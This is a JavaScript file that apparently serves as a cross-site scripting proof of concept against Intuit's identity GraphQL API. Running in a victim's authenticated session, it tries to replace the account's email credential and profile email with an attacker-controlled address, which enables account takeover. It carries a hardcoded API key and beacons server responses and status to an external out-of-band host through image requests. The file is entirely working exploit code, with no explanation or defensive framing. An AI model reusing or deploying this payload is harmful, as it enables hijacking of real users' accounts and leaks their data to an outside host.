(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var out=[];
var EMAIL='intuit-xss-poc-'+Math.floor(Math.random()*99999)+'@proton.me';

function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function beacon(tag,data){new Image().src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}

log('[*] XSS Email Change PoC (p47)');
log('[*] Origin: '+location.origin);
log('[*] Target email: '+EMAIL);
log('');

log('[1] Trying ReplaceEmail with minimal headers (same as working password change)...');
beacon('p47-start',EMAIL);

fetch('/identity-api/v2/graphql',{
method:'POST',
credentials:'include',
headers:{
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0'
},
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input: Identity_CreateOrReplaceEmailCredentialInput!) { identityCreateOrReplaceEmailCredential(input: $input) { __typename ... on Identity_CreateOrReplaceEmailCredentialSuccess { status } ... on Identity_CredentialUnauthorizedError { message } ... on Identity_CredentialInvalidInputError { message } ... on Identity_DigitalIdentityLockedOutError { message } ... on Identity_EmailCredentialMatchesExistingError { message } } }',
variables:{input:{newEmailAddress:EMAIL}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[1] Response: '+cr.substring(0,500));
beacon('p47-email-resp',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplaceEmailCredential){
var r1=crd.data.identityCreateOrReplaceEmailCredential;
if(r1.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=============================================');
log('  EMAIL CREDENTIAL CHANGED TO: '+EMAIL);
log('  Status: '+r1.status);
log('=============================================');
beacon('p47-SUCCESS',EMAIL);
return
}
log('[1] Result: '+r1.__typename+' - '+(r1.message||''));
}

log('');
log('[2] Trying updateEmailAddress (profile email)...');
beacon('p47-profile-try',EMAIL);

fetch('/identity-api/v2/graphql',{
method:'POST',
credentials:'include',
headers:{
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0'
},
body:JSON.stringify({
operationName:'UpdateEmail',
query:'mutation UpdateEmail($input: Identity_UpdateEmailAddressInput!) { updateEmailAddress(input: $input) { __typename ... on Identity_UpdateEmailAddressSuccess { emailAddress { emailAddress } } ... on Identity_UpdateEmailAddressError { message } } }',
variables:{input:{emailAddress:EMAIL}}
})
}).then(function(r2){return r2.text()}).then(function(cr2){
log('[2] Response: '+cr2.substring(0,500));
beacon('p47-profile-resp',cr2.substring(0,900));

var d2;try{d2=JSON.parse(cr2)}catch(e){}
if(d2&&d2.data&&d2.data.updateEmailAddress){
var r2=d2.data.updateEmailAddress;
if(r2.__typename==='Identity_UpdateEmailAddressSuccess'){
log('');
log('=============================================');
log('  PROFILE EMAIL CHANGED TO: '+EMAIL);
log('=============================================');
beacon('p47-profile-SUCCESS',EMAIL);
}else{
log('[2] Result: '+r2.__typename+' - '+(r2.message||''));
beacon('p47-profile-fail',r2.__typename);
}
}
}).catch(function(e2){
log('[2] Error: '+e2.message);
beacon('p47-profile-err',e2.message);
})

}).catch(function(err){
log('[!] Error: '+err.message);
beacon('p47-err',err.message);
});

}catch(e){
new Image().src=O+'/p47-crash?e='+encodeURIComponent(e.message);
}
})();
